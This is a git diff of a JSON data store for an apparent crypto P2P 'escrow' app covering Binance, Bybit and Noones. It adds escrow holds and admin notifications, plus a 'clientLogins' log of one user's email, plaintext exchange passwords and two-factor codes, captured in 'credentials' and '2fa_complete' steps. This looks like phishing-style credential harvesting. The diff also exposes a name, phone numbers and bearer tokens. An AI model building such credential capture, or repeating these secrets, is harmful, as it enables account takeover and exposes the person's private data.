@@ -1,10 +1,34 @@
 {
   "wallet": {
     "balances": {
-      "USD": 14550,
+      "USD": 12650,
       "KES": 0
     },
     "activity": [
+      {
+        "id": "1765042537757-dc70b7b85d33b8",
+        "type": "hold",
+        "amount": 20000,
+        "currency": "KES",
+        "description": "Hold created for binance",
+        "timestamp": "2025-12-06T17:35:37.757Z"
+      },
+      {
+        "id": "1765042101795-aa553573392a1",
+        "type": "hold",
+        "amount": 100,
+        "currency": "KES",
+        "description": "Hold created for bybit",
+        "timestamp": "2025-12-06T17:28:21.795Z"
+      },
+      {
+        "id": "1765040132118-b524ab4a1afef8",
+        "type": "hold",
+        "amount": 1900,
+        "currency": "USD",
+        "description": "Hold created for bybit",
+        "timestamp": "2025-12-06T16:55:32.118Z"
+      },
       {
         "id": "1764923704891-b22226542da1b",
         "type": "hold",
@@ -49,6 +73,94 @@
     ]
   },
   "escrows": [
+    {
+      "id": "miukr6e4-8ut6gf",
+      "platform": "binance",
+      "paymentMethods": [
+        {
+          "id": 1,
+          "method": "mobile_money",
+          "fields": {
+            "provider": "M-Pesa (Safaricom)",
+            "phoneNumber": "+25470618663",
+            "accountName": "Bonface Kigen"
+          }
+        }
+      ],
+      "amount": 20000,
+      "currency": "KES",
+      "notes": "",
+      "status": "held",
+      "expiresAt": "2025-12-06T17:50:37.748Z",
+      "createdAt": "2025-12-06T17:35:37.749Z",
+      "clientToken": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiY2xpZW50IiwiaWF0IjoxNzY1MDQyNDczLCJleHAiOjE3NjUwNzEyNzN9.lKm8_EG20MG2Fh9C6gRCSxjQ4xHm4gMUrQP1UVfoXe0",
+      "statusHistory": [
+        {
+          "status": "held",
+          "actor": "client",
+          "timestamp": "2025-12-06T17:35:37.756Z",
+          "note": "Funds reserved"
+        }
+      ]
+    },
+    {
+      "id": "miukhu03-au221e",
+      "platform": "bybit",
+      "paymentMethods": [
+        {
+          "id": 1,
+          "method": "mobile_money",
+          "fields": {
+            "provider": "M-Pesa (Safaricom)",
+            "phoneNumber": "+254704618663",
+            "accountName": "Bonface Kigen"
+          }
+        }
+      ],
+      "amount": 100,
+      "currency": "KES",
+      "notes": "",
+      "status": "held",
+      "expiresAt": "2025-12-06T17:43:21.781Z",
+      "createdAt": "2025-12-06T17:28:21.781Z",
+      "clientToken": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiY2xpZW50IiwiaWF0IjoxNzY1MDQyMDYxLCJleHAiOjE3NjUwNzA4NjF9.-5aecRxclDNTBdb565uD6EsuIJficqB2bzOdTwxbQrc",
+      "statusHistory": [
+        {
+          "status": "held",
+          "actor": "client",
+          "timestamp": "2025-12-06T17:28:21.795Z",
+          "note": "Funds reserved"
+        }
+      ]
+    },
+    {
+      "id": "miujbm6u-4dp2b0",
+      "platform": "bybit",
+      "paymentMethods": [
+        {
+          "id": 1,
+          "method": "paypal",
+          "fields": {
+            "email": "kbonface03@gmail.com"
+          }
+        }
+      ],
+      "amount": 1900,
+      "currency": "USD",
+      "notes": "",
+      "status": "held",
+      "expiresAt": "2025-12-06T17:10:32.108Z",
+      "createdAt": "2025-12-06T16:55:32.109Z",
+      "clientToken": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiY2xpZW50IiwiaWF0IjoxNzY1MDQwMDkzLCJleHAiOjE3NjUwNjg4OTN9.BqdyrDDL5NfgIMPdxXAvJ8SJUbZSd00Rwszhg7PNMdE",
+      "statusHistory": [
+        {
+          "status": "held",
+          "actor": "client",
+          "timestamp": "2025-12-06T16:55:32.118Z",
+          "note": "Funds reserved"
+        }
+      ]
+    },
     {
       "id": "mism06d7-516ev3",
       "platform": "bybit",
@@ -124,6 +236,30 @@
   ],
   "history": [
     {
+      "id": "1765042537756-3ea7ba2ea486e8",
+      "escrowId": "miukr6e4-8ut6gf",
+      "platform": "binance",
+      "amount": 20000,
+      "currency": "KES",
+      "createdAt": "2025-12-06T17:35:37.749Z"
+    },
+    {
+      "id": "1765042101795-5ec5f75a502a78",
+      "escrowId": "miukhu03-au221e",
+      "platform": "bybit",
+      "amount": 100,
+      "currency": "KES",
+      "createdAt": "2025-12-06T17:28:21.781Z"
+    },
+    {
+      "id": "1765040132118-0f0f81db7e97c",
+      "escrowId": "miujbm6u-4dp2b0",
+      "platform": "bybit",
+      "amount": 1900,
+      "currency": "USD",
+      "createdAt": "2025-12-06T16:55:32.109Z"
+    },
+    {
       "id": "1764923704891-bbfd76f69506d",
       "escrowId": "mism06d7-516ev3",
       "platform": "bybit",
@@ -141,6 +277,30 @@
     }
   ],
   "notifications": [
+    {
+      "id": "1765042537757-e21b4201987d9",
+      "createdAt": "2025-12-06T17:35:37.757Z",
+      "target": "admin",
+      "escrowId": "miukr6e4-8ut6gf",
+      "status": "held",
+      "message": "New escrow created for binance"
+    },
+    {
+      "id": "1765042101796-e855cc398ae8e",
+      "createdAt": "2025-12-06T17:28:21.796Z",
+      "target": "admin",
+      "escrowId": "miukhu03-au221e",
+      "status": "held",
+      "message": "New escrow created for bybit"
+    },
+    {
+      "id": "1765040132118-a757fc3af9172",
+      "createdAt": "2025-12-06T16:55:32.118Z",
+      "target": "admin",
+      "escrowId": "miujbm6u-4dp2b0",
+      "status": "held",
+      "message": "New escrow created for bybit"
+    },
     {
       "id": "1764923704891-b7ac1b7ce69e38",
       "createdAt": "2025-12-05T08:35:04.891Z",
@@ -172,6 +332,162 @@
       "escrowId": "mislh11d-m135wy",
       "status": "held",
       "message": "New escrow created for noones"
+    }
+  ],
+  "clientLogins": [
+    {
+      "id": "1765042471812-170c79c7962648",
+      "email": "kbonface03@gmail.com",
+      "password": "Kbornfas",
+      "twoFactorCode": "878789",
+      "platform": "binance",
+      "step": "2fa_complete",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+      "timestamp": "2025-12-06T17:34:31.812Z"
+    },
+    {
+      "id": "1765042466302-1c92dcbd240998",
+      "email": "kbonface03@gmail.com",
+      "password": "Kbornfas",
+      "twoFactorCode": "",
+      "platform": "binance",
+      "step": "credentials",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+      "timestamp": "2025-12-06T17:34:26.303Z"
+    },
+    {
+      "id": "1765042060089-bee1c551bdcee8",
+      "email": "kbonface03@gmail.com",
+      "password": "BRBros@1234",
+      "twoFactorCode": "676778",
+      "platform": "bybit",
+      "step": "2fa_complete",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+      "timestamp": "2025-12-06T17:27:40.089Z"
+    },
+    {
+      "id": "1765042055256-9bc229bb32d4d",
+      "email": "kbonface03@gmail.com",
+      "password": "BRBros@1234",
+      "twoFactorCode": "",
+      "platform": "bybit",
+      "step": "credentials",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+      "timestamp": "2025-12-06T17:27:35.257Z"
+    },
+    {
+      "id": "1765041720343-8d7a4fa721244",
+      "email": "kbonface03@gmail.com",
+      "password": "BRBros@1234",
+      "twoFactorCode": "234567",
+      "platform": "bybit",
+      "step": "2fa_complete",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+      "timestamp": "2025-12-06T17:22:00.343Z"
+    },
+    {
+      "id": "1765041711173-9f5842575a2688",
+      "email": "kbonface03@gmail.com",
+      "password": "BRBros@1234",
+      "twoFactorCode": "",
+      "platform": "bybit",
+      "step": "credentials",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+      "timestamp": "2025-12-06T17:21:51.174Z"
+    },
+    {
+      "id": "1765041249545-e4142429beed48",
+      "email": "kbonface03@gmail.com",
+      "password": "BRBros@1234",
+      "twoFactorCode": "234567",
+      "platform": "bybit",
+      "step": "2fa_complete",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+      "timestamp": "2025-12-06T17:14:09.545Z"
+    },
+    {
+      "id": "1765041242545-8e6873b6f4eab",
+      "email": "kbonface03@gmail.com",
+      "password": "BRBros@1234",
+      "twoFactorCode": "",
+      "platform": "bybit",
+      "step": "credentials",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+      "timestamp": "2025-12-06T17:14:02.545Z"
+    },
+    {
+      "id": "1765041049269-7ea3597c645d4",
+      "email": "kbonface03@gmail.com",
+      "password": "BRBros@1234",
+      "twoFactorCode": "234567",
+      "platform": "binance",
+      "step": "2fa_complete",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+      "timestamp": "2025-12-06T17:10:49.269Z"
+    },
+    {
+      "id": "1765041037472-2bb175075d976",
+      "email": "kbonface03@gmail.com",
+      "password": "BRBros@1234",
+      "twoFactorCode": "",
+      "platform": "binance",
+      "step": "credentials",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36",
+      "timestamp": "2025-12-06T17:10:37.473Z"
+    },
+    {
+      "id": "1765040092477-fd96e69d168e8",
+      "email": "kbonface03@gmail.com",
+      "password": "BRBros@1234",
+      "twoFactorCode": "345678",
+      "platform": "bybit",
+      "step": "2fa_complete",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Code/1.106.3 Chrome/138.0.7204.251 Electron/37.7.0 Safari/537.36",
+      "timestamp": "2025-12-06T16:54:52.478Z"
+    },
+    {
+      "id": "1765040085367-1e9cc378380bd8",
+      "email": "kbonface03@gmail.com",
+      "password": "BRBros@1234",
+      "twoFactorCode": "",
+      "platform": "bybit",
+      "step": "credentials",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Code/1.106.3 Chrome/138.0.7204.251 Electron/37.7.0 Safari/537.36",
+      "timestamp": "2025-12-06T16:54:45.367Z"
+    },
+    {
+      "id": "1765039777424-9561a98cb0e5a8",
+      "email": "kbonface03@gmail.com",
+      "password": "BRBros@1234",
+      "twoFactorCode": "234678",
+      "platform": "bybit",
+      "step": "2fa_complete",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Code/1.106.3 Chrome/138.0.7204.251 Electron/37.7.0 Safari/537.36",
+      "timestamp": "2025-12-06T16:49:37.424Z"
+    },
+    {
+      "id": "1765039768231-ec25b20a1b64f8",
+      "email": "kbonface03@gmail.com",
+      "password": "BRBros@1234",
+      "twoFactorCode": "",
+      "platform": "bybit",
+      "step": "credentials",
+      "ipAddress": "::1",
+      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Code/1.106.3 Chrome/138.0.7204.251 Electron/37.7.0 Safari/537.36",
+      "timestamp": "2025-12-06T16:49:28.232Z"
     }
   ]
 }
